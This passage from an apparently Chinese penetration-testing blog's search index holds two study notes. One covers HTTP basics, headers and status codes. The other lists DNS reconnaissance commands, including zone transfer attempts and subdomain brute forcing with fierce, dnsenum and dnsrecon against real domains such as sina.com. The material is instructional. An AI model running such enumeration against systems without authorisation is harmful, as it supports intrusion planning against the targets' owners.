        <content type="html"><![CDATA[<h4 id="Web技术发展"><a href="#Web技术发展" class="headerlink" title="Web技术发展"></a><strong>Web技术发展</strong></h4><ul><li><p>静态WEB</p></li><li><p>动态WEB</p><ul><li>应用程序</li><li>数据库</li><li>每人看到的内容不同</li><li>根据用户输入返回不同结果</li></ul></li><li><p>Web攻击类型有数百种</p><ul><li>最典型的几种</li></ul></li><li><p>Web攻击面</p><ul><li>Network</li><li>OS</li><li>Web Server</li><li>App Server</li><li>Web Application</li><li>Database</li><li>Browser</li></ul></li><li><p>HTTP协议基础</p><ul><li>明文<ul><li>无内建的机密性安全机制</li><li>嗅探或代理截断可查看全部明文信息</li><li>https只能提高传输层安全</li></ul></li><li>无状态<ul><li>每一次客户端和服务器端的通信都是独立过程</li><li>Web应用需要跟踪客户端会话(多步通信)</li><li>不使用cookie的应用,客户端每次请求都要重新身份验证(不现实)</li><li>Session用于在用户身份验证后跟踪用户行为轨迹<ul><li>提高用户体验,但增加了攻击向量</li></ul></li></ul></li><li>Cycle<ul><li>请求/响应</li></ul></li><li>重要的header<ul><li>Set-Cookie:服务器发给客户端的SessionID(被窃取的风险)</li><li>Content-Length:相应Body部分的字节长度</li><li>Location:重定向用户到另一个页面,可识别身份认证后允许访问的页面</li><li>Cookie:客户端发回给服务器证明用户状态的信息(头:值 成对出现)</li><li>Referrer:发起新请求之前用户位于哪个页面,服务器基于此头的安全限制很容易被修改绕过</li></ul></li></ul></li></ul><h4 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a><strong>状态码</strong></h4><ul><li>服务端的响应的状态码表示响应的结果类型(5大类50多个具体响应码)</li><li>100s:服务器响应的信息,通常表示服务器还有后续处理,很少出现</li><li>200s:请求被服务器成功接受并处理后返回的响应结果</li><li>300s:重定向,通常在身份认证成功后重定向到一个安全页面(301,302)</li><li>400s:表示客户端请求错误<ul><li>401:需要身份验证</li><li>403:拒绝访问</li><li>404:目标未发现</li></ul></li><li>500s:服务器内部错误(503:服务不可用)</li><li><code>http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>已知域名解析查询</title>
      <link href="/2013/03/11/Information_Gethering/%E5%B7%B2%E7%9F%A5%E5%9F%9F%E5%90%8D%E6%9F%A5%E8%AF%A2/"/>
      <url>/2013/03/11/Information_Gethering/%E5%B7%B2%E7%9F%A5%E5%9F%9F%E5%90%8D%E6%9F%A5%E8%AF%A2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>nslookup</p></blockquote><pre><code>nslookup sina.com type=any</code></pre><blockquote><p>DIG</p></blockquote><pre><code>dig sina.com any @1.1.1.1dig mail.163.com anydig +trace www.sian.com  #根域追踪  劫持查询</code></pre><blockquote><p>DNS区域传输</p></blockquote><pre><code>dig sina.com nsdig @ns1.example.com example.com axfrhost -T -l sina.com ns2.sina.com</code></pre><blockquote><p>DNS字典爆破</p></blockquote><pre><code>fierce -dnsserver 8.8.8.8 -dns sina.com.cn -wordlist hosts.txtdnsdict6 -d4 -t 16 -x sina.com #字典质量高，速度块dnsenum -f dnsbig.txt -dnsserver 8.8.8.8 sina.com -a sina.xmldnsmap sina.com -w dns.txtdnsrecon -d sina.com --lifetime 10 -t brt -D dnsbig.txt  #快dnsrecon -t std -d sina.com</code></pre><blockquote><p>查找字典位置</p></blockquote><pre><code>dpkg -L fiercefind / -name dnsenum</code></pre><blockquote><p>DNS注册信息</p></blockquote><pre><code>whois whois -h whois.apnic.net 1.1.1.1</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> 被动信息收集 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
